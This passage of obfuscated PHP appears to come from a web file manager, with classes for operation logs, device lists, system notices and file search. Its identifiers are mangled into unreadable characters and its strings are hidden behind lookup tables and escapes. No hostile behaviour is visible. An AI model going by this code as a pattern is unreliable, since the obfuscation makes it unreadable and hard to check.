IO::infoFullSimple($ëª‹Ö’‹[$ÖîÔ†Ô[87]]); } catch (Exception $§ÓµÑÂ) { continue; } $îâûËÖ‰[] = $ëª‹Ö’‹[$ÖîÔ†Ô[194]] = $ëŠæä¯ä[$ÖîÔ†Ô[194]]; $îâûËÖ‰[] = $ëª‹Ö’‹[$ÖîÔ†Ô[2241]] = $ëŠæä¯ä[$ÖîÔ†Ô[193]]; $õ‘¶»ÈÔ[$À‡»“ë†][$ÖîÔ†Ô[529]] = json_encode($ëª‹Ö’‹); continue; } $îâûËÖ‰[] = $ëª‹Ö’‹[$ÖîÔ†Ô[194]]; $îâûËÖ‰[] = $ëª‹Ö’‹[$ÖîÔ†Ô[2241]]; if ($ëª‹Ö’‹[$ÖîÔ†Ô[33]] == $ÖîÔ†Ô[628]) { $îâûËÖ‰[] = $ëª‹Ö’‹[$ÖîÔ†Ô[529]][$ÖîÔ†Ô[1268]]; $îâûËÖ‰[] = $ëª‹Ö’‹[$ÖîÔ†Ô[529]][$ÖîÔ†Ô[1269]]; } if ($ëª‹Ö’‹[$ÖîÔ†Ô[33]] == $ÖîÔ†Ô[2252]) { $îâûËÖ‰[] = $ëª‹Ö’‹[$ÖîÔ†Ô[529]][$ÖîÔ†Ô[194]]; } } if (!$îâûËÖ‰) { return array(); } return Model($ÖîÔ†Ô[921])->sourceListInfo($îâûËÖ‰, !0); } private function logList($ÕúÇí¸) { $¹áàš¦ =& $_SERVER[ÓïÕü]; $áŠ±ÃÓ = array_to_keyvalue($ÕúÇí¸, $¹áàš¦[12], $¹áàš¦[1806]); $ÏéäÃŠá = Model($¹áàš¦[602])->userListInfo(array_unique($áŠ±ÃÓ)); $ñÁÈú„È = $this->getSourceList($ÕúÇí¸); $Ö‚×­õº = $this->typeAll(); $´à¨°µ£ = array(); $˜Û—ÂÏé = array(); foreach ($ÕúÇí¸ as $úÙŒÉ„ä => $ùğİÆ»Š) { $ÑƒÒÓûß = $ùğİÆ»Š[$¹áàš¦[33]]; $·¡»Š¦Ë = isset($ÏéäÃŠá[$ùğİÆ»Š[$¹áàš¦[1806]]]) ? $ÏéäÃŠá[$ùğİÆ»Š[$¹áàš¦[1806]]] : !1; $©Ğß¡ÕŒ = strpos($ÑƒÒÓûß, $¹áàš¦[2480]) === 0 ? LNG($¹áàš¦[2481]) : LNG($¹áàš¦[2476]); $ùğİÆ»Š[$¹áàš¦[32]] = isset($·¡»Š¦Ë[$¹áàš¦[32]]) ? $·¡»Š¦Ë[$¹áàš¦[32]] : LNG($¹áàš¦[2476]); $ùğİÆ»Š[$¹áàš¦[2303]] = isset($·¡»Š¦Ë[$¹áàš¦[2303]]) ? $·¡»Š¦Ë[$¹áàš¦[2303]] : $¹áàš¦[12]; $ùğİÆ»Š[$¹áàš¦[1694]] = isset($Ö‚×­õº[$ÑƒÒÓûß]) ? $Ö‚×­õº[$ÑƒÒÓûß] : $©Ğß¡ÕŒ; $ùğİÆ»Š[$¹áàš¦[2186]] = $·¡»Š¦Ë; $“ô†¥Ì = json_decode($ùğİÆ»Š[$¹áàš¦[529]], !0); $ùğİÆ»Š[$¹áàš¦[2473]] = isset($“ô†¥Ì[$¹áàš¦[2473]]) ? $“ô†¥Ì[$¹áàš¦[2473]] : $¹áàš¦[12]; $ùğİÆ»Š[$¹áàš¦[2477]] = IpLocation::get($ùğİÆ»Š[$¹áàš¦[2473]]); if (strpos($ÑƒÒÓûß, $¹áàš¦[2243]) === 0 || isset($“ô†¥Ì[$¹áàš¦[2241]])) { $“ô†¥Ì[$¹áàš¦[90]] = $ñÁÈú„È[$“ô†¥Ì[$¹áàš¦[194]]]; $“ô†¥Ì[$¹áàš¦[2257]] = $ñÁÈú„È[$“ô†¥Ì[$¹áàš¦[2241]]]; if ($“ô†¥Ì[$¹áàš¦[33]] == $¹áàš¦[628]) { $“ô†¥Ì[$¹áàš¦[529]][$¹áàš¦[1268]] = $ñÁÈú„È[$“ô†¥Ì[$¹áàš¦[529]][$¹áàš¦[1268]]]; $“ô†¥Ì[$¹áàš¦[529]][$¹áàš¦[1269]] = $ñÁÈú„È[$“ô†¥Ì[$¹áàš¦[529]][$¹áàš¦[1269]]]; } if ($“ô†¥Ì[$¹áàš¦[33]] == $¹áàš¦[2252]) { $“ô†¥Ì[$¹áàš¦[529]][$¹áàš¦[194]] = $ñÁÈú„È[$“ô†¥Ì[$¹áàš¦[529]][$¹áàš¦[194]]]; } if ($“ô†¥Ì[$¹áàš¦[33]] == $¹áàš¦[1975]) { $“ô†¥Ì[$¹áàš¦[2257]] = $“ô†¥Ì[$¹áàš¦[90]]; $“ô†¥Ì[$¹áàš¦[2241]] = $“ô†¥Ì[$¹áàš¦[2257]][$¹áàš¦[194]]; $“ô†¥Ì[$¹áàš¦[90]] = !1; $“ô†¥Ì[$¹áàš¦[194]] = $¹áàš¦[12]; } $ßâ˜Ÿ®á = array($¹áàš¦[1975], $¹áàš¦[2239]); if (!in_array($“ô†¥Ì[$¹áàš¦[33]], $ßâ˜Ÿ®á)) { if ($“ô†¥Ì[$¹áàš¦[90]] && $“ô†¥Ì[$¹áàš¦[90]][$¹áàš¦[191]] == $¹áàš¦[192]) { $˜Û—ÂÏé[] = $ùğİÆ»Š[$¹áàš¦[478]]; unset($ÕúÇí¸[$úÙŒÉ„ä]); continue; } if ($“ô†¥Ì[$¹áàš¦[2257]] && $“ô†¥Ì[$¹áàš¦[2257]][$¹áàš¦[191]] == $¹áàš¦[192]) { $˜Û—ÂÏé[] = $ùğİÆ»Š[$¹áàš¦[478]]; unset($ÕúÇí¸[$úÙŒÉ„ä]); continue; } } } $ùğİÆ»Š[$¹áàš¦[529]] = $“ô†¥Ì; unset($ùğİÆ»Š[$¹áàš¦[2482]]); $´à¨°µ£[] = $ùğİÆ»Š; } $this->clearSystemPathLog($˜Û—ÂÏé); return $´à¨°µ£; } private function clearSystemPathLog($óüÚş•) { $Õ’±ı´Õ =& $_SERVER[ÓïÕü]; if (count($óüÚş•) == 0) { return; } $µˆ”Ãİµ = array($Õ’±ı´Õ[478] => array($Õ’±ı´Õ[7], array_unique($óüÚş•))); $this->where($µˆ”Ãİµ)->delete(); } public function deviceList($ÂÖğ—æÜ, $ÚµÂò ¸ = 0) { $º–§êĞ¿ =& $_SERVER[ÓïÕü]; $ø³ƒÛâ† = array($º–§êĞ¿[1806] => $ÂÖğ—æÜ, $º–§êĞ¿[234] => array($º–§êĞ¿[1118], $ÚµÂò ¸), $º–§êĞ¿[33] => $º–§êĞ¿[1949]); $øÁÎËğÃ = array(); $¿ÄÎ€Æ± = $this->field($º–§êĞ¿[2483])->where($ø³ƒÛâ†)->order($º–§êĞ¿[2255])->limit(50)->select(); foreach ($¿ÄÎ€Æ± as $ô§Ü÷‘¼ => $Ì²äÃÛ÷) { if ($ô§Ü÷‘¼ > 0 && abs($Ì²äÃÛ÷[$º–§êĞ¿[234]] - $¿ÄÎ€Æ±[$ô§Ü÷‘¼ - 1][$º–§êĞ¿[234]]) < 5) { continue; } $Çã¦Í» = json_decode($Ì²äÃÛ÷[$º–§êĞ¿[529]], !0); $Ì²äÃÛ÷[$º–§êĞ¿[2473]] = isset($Çã¦Í»[$º–§êĞ¿[2473]]) ? $Çã¦Í»[$º–§êĞ¿[2473]] : $º–§êĞ¿[12]; unset($Çã¦Í»[$º–§êĞ¿[2473]]); $ß¶ì²ñ¶ = $this->deviceType($Çã¦Í»[$º–§êĞ¿[2244]]); if (isset($øÁÎËğÃ[$ß¶ì²ñ¶])) { continue; } $Ì²äÃÛ÷[$º–§êĞ¿[2477]] = IpLocation::get($Ì²äÃÛ÷[$º–§êĞ¿[2473]]); $Ì²äÃÛ÷[$º–§êĞ¿[529]] = $Çã¦Í»; $øÁÎËğÃ[$ß¶ì²ñ¶] = $Ì²äÃÛ÷; } return array_values($øÁÎËğÃ); } public function deviceType($áşş¥óş) { return $áşş¥óş; } } class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\x6d\x2e\156\157\164\151\143\x65\x4c\x69\x73\x74"; public $field = array("\156\x61\x6d\x65", "\x63\x6f\x6e\164\145\x6e\164", "\141\165\x74\150", "\155\x6f\x64\x65", "\x74\151\x6d\145", "\164\x79\x70\145", "\x6c\x65\166\x65\x6c", "\145\156\x61\x62\x6c\x65", "\163\157\x72\x74"); public function listData($äã±½æã = false, $ÔÒŠ¡®© = "\x73\157\162\164", $£ÌÂ³ğ« = false) { return parent::listData($äã±½æã, $ÔÒŠ¡®©, $£ÌÂ³ğ«); } public function add($ãùé¶Ûù) { $êş€øæ‚ =& $_SERVER[ÓïÕü]; $ß¾ŠÅ­Ì = time(); if ($ãùé¶Ûù[$êş€øæ‚[16]] == $êş€øæ‚[2484]) { $ß¾ŠÅ­Ì = strtotime($ãùé¶Ûù[$êş€øæ‚[207]]); } $ãùé¶Ûù[$êş€øæ‚[207]] = $ß¾ŠÅ­Ì; return parent::insert($ãùé¶Ûù); } public function update($¦´’íùò, $ œää†) { $úÈ¥Ÿôå =& $_SERVER[ÓïÕü]; $ÎÑºƒÇö = $this->listData($¦´’íùò); if (!$ÎÑºƒÇö) { return !1; } $•œØääÈ = time(); if ($ œää†[$úÈ¥Ÿôå[16]] == $úÈ¥Ÿôå[2484]) { $•œØääÈ = strtotime($ œää†[$úÈ¥Ÿôå[207]]); } $ œää†[$úÈ¥Ÿôå[207]] = $•œØääÈ; return parent::update($¦´’íùò, $ œää†); } public function remove($– Øİ–î) { $Ğšıİâ = $this->listData($– Øİ–î); if (!$Ğšıİâ || $Ğšıİâ[$_SERVER[ÓïÕü][192]]) { return !1; } return parent::remove($– Øİ–î); } public function sort($šÊ×ê, $½Å»é‰¡) { return parent::update($šÊ×ê, $½Å»é‰¡); } public function enable($Šõ¸•öí, $×ûŸ™²) { return parent::update($Šõ¸•öí, array($_SERVER[ÓïÕü][2485] => $×ûŸ™²)); } private function initUserOption() { $ŒÚ©” « =& $_SERVER[ÓïÕü]; $this->optionType = $ŒÚ©” «[2486]; $this->modelType = $ŒÚ©” «[2487]; $this->field = array($ŒÚ©” «[2488], $ŒÚ©” «[32], $ŒÚ©” «[207], $ŒÚ©” «[33], $ŒÚ©” «[2489], $ŒÚ©” «[841], $ŒÚ©” «[229]); } public function userNoticeGet($ŒÔ©×‚Æ = false) { $this->initUserOption(); return parent::listData($ŒÔ©×‚Æ, $_SERVER[ÓïÕü][478], !0); } public function userNoticeAdd($Î¼“¶ı¨) { $ãşä¸Æá =& $_SERVER[ÓïÕü]; $this->initUserOption(); $÷…ûıš­ = $this->findByKey($ãşä¸Æá[2488], $Î¼“¶ı¨[$ãşä¸Æá[478]]); if ($÷…ûıš­) { return !0; } $ ïÎ”• = array($ãşä¸Æá[2488] => $Î¼“¶ı¨[$ãşä¸Æá[478]], $ãşä¸Æá[32] => $Î¼“¶ı¨[$ãşä¸Æá[32]], $ãşä¸Æá[207] => $Î¼“¶ı¨[$ãşä¸Æá[207]], $ãşä¸Æá[33] => isset($Î¼“¶ı¨[$ãşä¸Æá[33]]) ? $Î¼“¶ı¨[$ãşä¸Æá[33]] : 1, $ãşä¸Æá[2489] => isset($Î¼“¶ı¨[$ãşä¸Æá[2489]]) ? $Î¼“¶ı¨[$ãşä¸Æá[2489]] : 0, $ãşä¸Æá[841] => 0, $ãşä¸Æá[229] => 0); return parent::insert($ ïÎ”•); } public function userNoticeEdit($úô¤¨Á, $ßŞ¶×) { $this->initUserOption(); return parent::update($úô¤¨Á, $ßŞ¶×); } } goto fî…Ñâ®ÇÅ; e”ßÌ’ØÎ: class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($’”àšÇÅ) { $ÄÏŞïÊË =& $_SERVER[ÓïÕü]; $ØÜÊŠ = KodIO::fileTypeList(); $Ó¤ªä‚ö = $ØÜÊŠ[$’”àšÇÅ]; if (!$Ó¤ªä‚ö) { return array(); } $ÖË¿˜ó· = $Ó¤ªä‚ö[$ÄÏŞïÊË[169]]; $Ç¼ğô´™ = $ÄÏŞïÊË[7]; if (!$Ó¤ªä‚ö[$ÄÏŞïÊË[169]]) { $¯üŸÒú = array_to_keyvalue($ØÜÊŠ, $ÄÏŞïÊË[12], $ÄÏŞïÊË[169]); $ÖË¿˜ó· = implode($ÄÏŞïÊË[50], $¯üŸÒú); $Ç¼ğô´™ = $ÄÏŞïÊË[2271]; } $§ šæø³ = explode($ÄÏŞïÊË[50], trim($ÖË¿˜ó·, $ÄÏŞïÊË[50])); return array($Ç¼ğô´™, $§ šæø³); } public function listPathType($Œ¿µœ„µ) { $¶ÅÎ¿’ =& $_SERVER[ÓïÕü]; $İëİ†Îú = $this->fileTypeWhere($Œ¿µœ„µ); if (!$İëİ†Îú) { return array(); } $Œóƒ¾°¦ = USER_ID; $³ØÕæ§Ş = Model($¶ÅÎ¿’[602])->getInfo($Œóƒ¾°¦); $Ä˜©Á‹ = array($¶ÅÎ¿’[656] => SourceModel::TYPE_USER, $¶ÅÎ¿’[589] => array($¶ÅÎ¿’[620], $¶ÅÎ¿’[598] . $³ØÕæ§Ş[$¶ÅÎ¿’[90]][$¶ÅÎ¿’[194]] . $¶ÅÎ¿’[621]), $¶ÅÎ¿’[657] => $Œóƒ¾°¦, $¶ÅÎ¿’[654] => 0, $¶ÅÎ¿’[655] => $İëİ†Îú); return $this->listSource($Ä˜©Á‹); } public function listSearch($ãŒÀ¡—Š, $ê²ãòŒü = 300) { $µÖÛÕŠ =& $_SERVER[ÓïÕü]; if (isset($ãŒÀ¡—Š[$µÖÛÕŠ[2105]]) && $ãŒÀ¡—Š[$µÖÛÕŠ[2105]]) { $ãŒÀ¡—Š[$µÖÛÕŠ[2105]] = str_replace($µÖÛÕŠ[463], $µÖÛÕŠ[2272], trim($ãŒÀ¡—Š[$µÖÛÕŠ[2105]])); } $ÔóÛ€£Ò = $this->_parseSearchWhere($ãŒÀ¡—Š); if (!isset($ÔóÛ€£Ò[$µÖÛÕŠ[508]])) { $ÔóÛ€£Ò[$µÖÛÕŠ[508]] = 0; } $×„•îäà = $µÖÛÕŠ[2273]; $Ïˆéµ¼„ = $ÔóÛ€£Ò; $óÂ½¶àö = $×„•îäà; $this->_listSearchBindPinyin($ãŒÀ¡—Š, $ÔóÛ€£Ò, $×„•îäà); $this->alias($µÖÛÕŠ[522])->_makeOrder(); $ÔóÛ€£Ò = $this->parseWhereLike($ÔóÛ€£Ò); $™£å©Ö = $this->distinct(!0)->field($×„•îäà)->where($ÔóÛ€£Ò)->selectPage($ê²ãòŒü); if ($GLOBALS[$µÖÛÕŠ[6]][$µÖÛÕŠ[460]][$µÖÛÕŠ[461]] && Input::check($ãŒÀ¡—Š[$µÖÛÕŠ[2105]], $µÖÛÕŠ[663]) && $™£å©Ö[$µÖÛÕŠ[445]][$µÖÛÕŠ[431]] == 1 && $™£å©Ö[$µÖÛÕŠ[445]][$µÖÛÕŠ[446]] == 0) { $™£å©Ö = $this->distinct(!0)->field($×„•îäà)->where($Ïˆéµ¼„)->limit(1000)->select(); $™£å©Ö = array_page_split($™£å©Ö, !1, $ê²ãòŒü); } $this->_listSearchFileContent($™£å©Ö, $ãŒÀ¡—Š, $óÂ½¶àö, $Ïˆéµ¼„); $this->_listSearchDesc($™£å©Ö, $ãŒÀ¡—Š, $óÂ½¶àö); $this->_listSearchTag($™£å©Ö, $ãŒÀ¡—Š, $óÂ½¶àö); $this->_listSearchGroupTag($™£å©Ö, $ãŒÀ¡—Š, $óÂ½¶àö); $this->_listDataApply($™£å©Ö[$µÖÛÕŠ[448]]); $this->_listMake($™£å©Ö); return $™£å©Ö; } private function _listSearchFileContent(&$á”¢Û¢, $¸Ë—‚Ïº, $Âäçßë³, $™É¸»²æ) { $Ò„ÃÂš =& $_SERVER[ÓïÕü]; if (!$¸Ë—‚Ïº[$Ò„ÃÂš[2105]] || $á”¢Û¢[$Ò„ÃÂš[445]][$Ò„ÃÂš[431]] > 1) { return; } if (!isset($™É¸»²æ[$Ò„ÃÂš[32]]) || !is_array($¸Ë—‚Ïº[$Ò„ÃÂš[546]])) { return; } $™É¸»²æ[$Ò„ÃÂš[546]] = array($Ò„ÃÂš[7], $¸Ë—‚Ïº[$Ò„ÃÂš[546]]); unset($™É¸»²æ[$Ò„ÃÂš[32]]); unset($¸Ë—‚Ïº[$Ò„ÃÂš[546]]); $ÓÙœÕ™ = $this->field($Âäçßë³)->where($™É¸»²æ)->limit($Ò„ÃÂš[2274])->select(); if (!$ÓÙœÕ™ || count($ÓÙœÕ™) == 0) { return; } $á”¢Û¢[$Ò„ÃÂš[448]] = array_merge($ÓÙœÕ™, $á”¢Û¢[$Ò„ÃÂš[448]]); $á”¢Û¢[$Ò„ÃÂš[445]][$Ò„ÃÂš[446]] += count($ÓÙœÕ™); } private function _listSearchTag(&$ˆ²ŒäÏı, $Îñ‚ÃÆ, $ĞÏˆşô) { $Ä®şœÇ¡ =& $_SERVER[ÓïÕü]; if (empty($Îñ‚ÃÆ[$Ä®şœÇ¡[1965]]) || !in_array($Ä®şœÇ¡[2275], $Îñ‚ÃÆ[$Ä®şœÇ¡[1965]])) { return; } if (!$Îñ‚ÃÆ[$Ä®şœÇ¡[2105]] || $ˆ²ŒäÏı[$Ä®şœÇ¡[445]][$Ä®şœÇ¡[431]] > 1) { return; } $×àÙÑÉâ = Model($Ä®şœÇ¡[2276])->listData(); $•‡â‰Ä€ = array(); $êùˆ§ë = $Îñ‚ÃÆ[$Ä®şœÇ¡[2105]]; foreach ($×àÙÑÉâ as $›Ó¯äæ¶) { $šÅ©’µÛ = $›Ó¯äæ¶[$Ä®şœÇ¡[32]]; $İ¯àË…’ = str_replace($Ä®şœÇ¡[53], $Ä®şœÇ¡[12], Pinyin::get($šÅ©’µÛ)); if (stripos($šÅ©’µÛ, $êùˆ§ë) !== !1 || stripos($İ¯àË…’, $êùˆ§ë) !== !1) { $•‡â‰Ä€[] = $›Ó¯äæ¶[$Ä®şœÇ¡[478]]; } } if (!$•‡â‰Ä€) { return; } $Ò×ÙÂ· = array($Ä®şœÇ¡[503] => array($Ä®şœÇ¡[7], $•‡â‰Ä€), $Ä®şœÇ¡[1806] => USER_ID); $«êöÄÔ— = Model($Ä®şœÇ¡[505])->field($Ä®şœÇ¡[87])->where($Ò×ÙÂ·)->select(); $«êöÄÔ— = array_to_keyvalue($«êöÄÔ—, $Ä®şœÇ¡[12], $Ä®şœÇ¡[87]); $öğ©øï‚ = array_unique($«êöÄÔ—); $this->_listSearchMerge($ˆ²ŒäÏı, $Îñ‚ÃÆ, $ĞÏˆşô, $öğ©øï‚); } private function _listSearchDesc(&$ê¼¡ä ƒ, $ˆÚ´Û¨, $ÊÄÚóôº) { $‰ş’ÃŞŠ =& $_SERVER[ÓïÕü]; if (empty($ˆÚ´Û¨[$‰ş’ÃŞŠ[1965]]) || !in_array($‰ş’ÃŞŠ[529], $ˆÚ´Û¨[$‰ş’ÃŞŠ[1965]])) { return; } if (!$ˆÚ´Û¨[$‰ş’ÃŞŠ[2105]] || $ê¼¡ä ƒ[$‰ş’ÃŞŠ[445]][$‰ş’ÃŞŠ[431]] > 1) { return; } $“Œ£İ  = array($‰ş’ÃŞŠ[97] => $‰ş’ÃŞŠ[529], $‰ş’ÃŞŠ[453] => array($‰ş’ÃŞŠ[462], $‰ş’ÃŞŠ[2107] . $ˆÚ´Û¨[$‰ş’ÃŞŠ[2105]] . $‰ş’ÃŞŠ[2107])); $¦ÂÛÔĞ» = !1; if ($¦ÂÛÔĞ») { $«úÁ©­Ó = $this->listSearchChildren($ˆÚ´Û¨[$‰ş’ÃŞŠ[193]]); $«úÁ©­Ó = array_unique($«úÁ©­Ó); if (!$«úÁ©­Ó) { return; } $“Œ£İ [$‰ş’ÃŞŠ[194]] = array($‰ş’ÃŞŠ[7], $«úÁ©­Ó); } $Ô¯†²œÆ = Model($‰ş’ÃŞŠ[640])->field($‰ş’ÃŞŠ[194])->where($“Œ£İ )->limit(5000)->select(); $ûüØî§Ö = array_to_keyvalue($Ô¯†²œÆ, $‰ş’ÃŞŠ[12], $‰ş’ÃŞŠ[194]); $this->_listSearchMerge($ê¼¡ä ƒ, $ˆÚ´Û¨, $ÊÄÚóôº, $ûüØî§Ö); } private function _listSearchGroupTag(&$¹ú¼ÎìÙ, $ºíÓïİ, $Æ¸ì€Ï) { $ì¥Š½« =& $_SERVER[ÓïÕü]; if (empty($ºíÓïİ[$ì¥Š½«[1965]]) || !in_array($ì¥Š½«[2275], $ºíÓïİ[$ì¥Š½«[1965]])) { return; } if (!$ºíÓïİ[$ì¥Š½«[2105]] || $¹ú¼ÎìÙ[$ì¥Š½«[445]][$ì¥Š½«[431]] > 1 || !$ºíÓïİ[$ì¥Š½«[193]]) { return; } $ó¢Ø¼·  = $this->sourceInfo($ºíÓïİ[$ì¥Š½«[193]]); if (!$ó¢Ø¼·  || $ó¢Ø¼· [$ì¥Š½«[191]] != SourceModel::TYPE_GROUP) { return; } $³ı¶‚à = $ó¢Ø¼· [$ì¥Š½«[574]]; $ÜÂ©â—ñ = Model($ì¥Š½«[2277])->get($³ı¶‚à); $ÇŠƒ£ÉÁ = array(); $–ª¨ô• = $ºíÓïİ[$ì¥Š½«[2105]]; foreach ($ÜÂ©â—ñ[$ì¥Š½«[448]] as $îÊßÊ›ï) { $¯‘œÃïâ = $îÊßÊ›ï[$ì¥Š½«[32]]; $¿¹­óÌ® = str_replace($ì¥Š½«[53], $ì¥Š½«[12], Pinyin::get($¯‘œÃïâ)); if (stripos($¯‘œÃïâ, $–ª¨ô•) !== !1 || stripos($¿¹­óÌ®, $–ª¨ô•) !== !1) { $ÇŠƒ£ÉÁ[] = $îÊßÊ›ï[$ì¥Š½«[478]]; } } if (!$ÇŠƒ£ÉÁ) { return; } $Ëõ’ˆãö = array($ì¥Š½«[503] => array($ì¥Š½«[7], $ÇŠƒ£ÉÁ), $ì¥Š½«[1806] => 0, $ì¥Š½«[33] => $ì¥Š½«[1414] . $³ı¶‚à); $ğ¡’Í¢Ü = Model($ì¥Š½«[505])->field($ì¥Š½«[87])->where($Ëõ’ˆãö)->select(); $ğ¡’Í¢Ü = array_to_keyvalue($ğ¡’Í¢Ü, $ì¥Š½«[12], $ì¥Š½«[87]); $ªúÃÖ‹’ = array_unique($ğ¡’Í¢Ü); $this->_listSearchMerge($¹ú¼ÎìÙ, $ºíÓïİ, $Æ¸ì€Ï, $ªúÃÖ‹’); } private function _listSearchMerge(&$ù‘¯ËÏã, $ıÔ­ôË, $¦§×²°Ÿ, $ÈµÆæ˜‰) { $†Ìä»ê =& $_SERVER[ÓïÕü]; if (!$ÈµÆæ˜‰) { return; } $²ÍµƒĞ = array_to_keyvalue($ù‘¯ËÏã[$†Ìä»ê[448]], $†Ìä»ê[12], $†Ìä»ê[194]); $ôÌìïÎâ = array_diff($ÈµÆæ˜‰, $²ÍµƒĞ); if (!$ôÌìïÎâ) { return; } $ôÍŒµ¥® = array($†Ìä»ê[194] => array($†Ìä»ê[7], $ôÌìïÎâ)); $î†¼ŸŠ = $this->field($¦§×²°Ÿ)->where($ôÍŒµ¥®)->select(); if (!$î†¼ŸŠ) { return; } $Ø“š²†Ä = array(); foreach ($î†¼ŸŠ as $ˆØ¼Çœ«) { if ($this->_listSearchFilter($ˆØ¼Çœ«, $ıÔ­ôË)) { $Ø“š²†Ä[] = $ˆØ¼Çœ«; } } $ù‘¯ËÏã[$†Ìä»ê[448]] = array_merge($Ø“š²†Ä, $ù‘¯ËÏã[$†Ìä»ê[448]]); $ù‘¯ËÏã[$†Ìä»ê[445]][$†Ìä»ê[446]] += count($Ø“š²†Ä); } private function _listSearchFilter($˜ÇâÊ¾ù, $ı½Ø£ Î) { $üÇÉˆœó =& $_SERVER[ÓïÕü]; $şÜîöâÖ = $˜ÇâÊ¾ù[$üÇÉˆœó[488]] == $üÇÉˆœó[91]; if (!strstr($˜ÇâÊ¾ù[$üÇÉˆœó[589]], $üÇÉˆœó[50] . $ı½Ø£ Î[$üÇÉˆœó[193]] . $üÇÉˆœó[50])) { return !1; } if (isset($ı½Ø£ Î[$üÇÉˆœó[489]]) && $ı½Ø£ Î[$üÇÉˆœó[489]] != $üÇÉˆœó[867]) { if ($ı½Ø£ Î[$üÇÉˆœó[489]] == $üÇÉˆœó[78] && !$şÜîöâÖ) { return !1; } if ($ı½Ø£ Î[$üÇÉˆœó[489]] != $üÇÉˆœó[78] && $şÜîöâÖ) { return !1; } if (!strstr($˜ÇâÊ¾ù[$üÇÉˆœó[169]], $üÇÉˆœó[50] . $ı½Ø£ Î[$üÇÉˆœó[489]] . $üÇÉˆœó[50])) { return !1; } } if (isset($ı½Ø£ Î[$üÇÉˆœó[2278]]) && $ı½Ø£ Î[$üÇÉˆœó[2278]] < $˜ÇâÊ¾ù[$üÇÉˆœó[79]]) { return !1; } if (isset($ı½Ø£ Î[$üÇÉˆœó[2279]]) && $ı½Ø£ Î[$üÇÉˆœó[2279]] > $˜ÇâÊ¾ù[$üÇÉˆœó[79]]) { return !1; } if (isset($ı½Ø£ Î[$üÇÉˆœó[670]]) && $ı½Ø£ Î[$üÇÉˆœó[670]] != $˜ÇâÊ¾ù[$üÇÉˆœó[532]]) { return !1; } return !0; } public function listSearchChildren($ºÚëÒ™, $Ğ§ÄğÌá = 5000) { $ï‡ÉË¿ =& $_SERVER[ÓïÕü]; $Ìê‚²Ğ = array(); $À™õï˜Û = $this->sourceInfo($ºÚëÒ™); $ÈãöˆÀÎ = array($ï‡ÉË¿[589] => array($ï‡ÉË¿[462], $À™õï˜Û[$ï‡ÉË¿[589]] . $À™õï˜Û[$ï‡ÉË¿[194]] . $ï‡ÉË¿[621])); $³ùı³Š½ = $this->field($ï‡ÉË¿[79])->where($ÈãöˆÀÎ)->limit($Ğ§ÄğÌá + 1)->select(); $Úı‹¬‹‰ = is_array($³ùı³Š½) ? count($³ùı³Š½) : 0; if ($Úı‹¬‹‰ > $Ğ§ÄğÌá) { return $this->_listSearchChildrenNear($ºÚëÒ™, $Ğ§ÄğÌá); } $™ıî¿ = $this->field($ï‡ÉË¿[194])->where($ÈãöˆÀÎ)->select(); $Ìê‚²Ğ = array_to_keyvalue($™ıî¿, $ï‡ÉË¿[12], $ï‡ÉË¿[194]); return $Ìê‚²Ğ; } private function _listSearchChildrenNear($µ—şéÏÍ, $‡×û„¯‘) { $ñéÑäÃø =& $_SERVER[ÓïÕü]; $¾†”ıßé = array(); $ƒ¦àÇ› = array($ñéÑäÃø[193] => $µ—şéÏÍ); $‰¬§©é  = $this->field($ñéÑäÃø[2280])->where($ƒ¦àÇ›)->select(); $øüçÒÜš = array_to_keyvalue(array_filter_by_field($‰¬§©é , $ñéÑäÃø[488], $ñéÑäÃø[91]), $ñéÑäÃø[12], $ñéÑäÃø[194]); $¾†”ıßé = array_merge($¾†”ıßé, array_to_keyvalue($‰¬§©é , $ñéÑäÃø[12], $ñéÑäÃø[194])); if (!$øüçÒÜš) { return $¾†”ıßé; } $ƒ¦àÇ› = array($ñéÑäÃø[193] => array($ñéÑäÃø[7], $øüçÒÜš)); $‰¬§©é  = $this->field($ñéÑäÃø[2280])->where($ƒ¦àÇ›)->limit($‡×û„¯‘)->select(); $¾†”ıßé = array_merge($¾†”ıßé, array_to_keyvalue($‰¬§©é , $ñéÑäÃø[12], $ñéÑäÃø[194])); $¾†”ıßé = array_slice($¾†”ıßé, 0, intval($‡×û„¯‘)); return $¾†”ıßé; } private function _listSearchBindPinyin($Œà†åÍ, &$•ôûôüê, &$ÏšäÇ†Ò) { $²Û‡¹âƒ =& $_SERVER[ÓïÕü]; if (!isset($Œà†åÍ[$²Û‡¹âƒ[2105]]) || !$Œà†åÍ[$²Û‡¹âƒ[2105]]) { return; } if (!Input::check($Œà†åÍ[$²Û‡¹âƒ[2105]], $²Û‡¹âƒ[396]) || strlen($Œà†åÍ[$²Û‡¹âƒ[2105]]) < 2) { return; } $ğæ–ªÅ = "\114\105\x46\x54\40\112\x4f\111\116\x20{$this->tablePrefix}\x69\x6f\x5f\x73\157\165\162\143\x65\x5f\155\145\x74\141\x20\x6d\145\x74\141\x20\157\156\40\x73\x6f\x75\x72\x63\x65\56\163\157\x75\x72\x63\145\111\104\40\x3d\40\155\145\164\141\56\x73\x6f\165\x72\x63\145\111\104"; $ñ¬ü›º… = array(); $ÏšäÇ†Ò = str_replace(array($²Û‡¹âƒ[288], $²Û‡¹âƒ[53], $²Û‡¹âƒ[2281]), $²Û‡¹âƒ[12], $ÏšäÇ†Ò); $ÏšäÇ†Ò = $²Û‡¹âƒ[514] . str_replace($²Û‡¹âƒ[50], $²Û‡¹âƒ[515], $ÏšäÇ†Ò); $ÉÌñ¼À– = $•ôûôüê[$²Û‡¹âƒ[32]]; unset($•ôûôüê[$²Û‡¹âƒ[32]]); foreach ($•ôûôüê as $–ÔÄô¾ª => $¨´ÙùÒÓ) { $ñ¬ü›º…[$²Û‡¹âƒ[514] . $–ÔÄô¾ª] = $¨´ÙùÒÓ; } foreach ($ÉÌñ¼À– as $€İâÎ“â) { $ñ¬ü›º…[] = array($²Û‡¹âƒ[519] => $€İâÎ“â, $²Û‡¹âƒ[1104] => $²Û‡¹âƒ[2109], array($²Û‡¹âƒ[2282] => $€İâÎ“â, $²Û‡¹âƒ[2283] => array($²Û‡¹âƒ[7], array($²Û‡¹âƒ[541], $²Û‡¹âƒ[540])))); } $this->join($ğæ–ªÅ); $•ôûôüê = $ñ¬ü›º…; } private function _parseSearchWhere($ŞÊõ¬Ê) { $•Œ³ó¾Í =& $_SERVER[ÓïÕü]; $Õ—“¿ÊŠ = array(); if (isset($ŞÊõ¬Ê[$•Œ³ó¾Í[851]]) && $ŞÊõ¬Ê[$•Œ³ó¾Í[851]]) { 